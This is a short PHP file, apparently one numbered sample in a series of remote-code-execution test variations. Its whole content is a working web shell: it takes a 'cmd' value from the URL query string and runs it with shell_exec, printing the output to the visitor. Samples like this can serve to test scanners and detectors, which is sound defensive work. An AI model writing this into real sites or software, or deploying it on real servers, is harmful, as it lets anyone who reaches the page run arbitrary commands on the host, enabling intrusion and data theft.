<?php
// RCE test variation #387
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>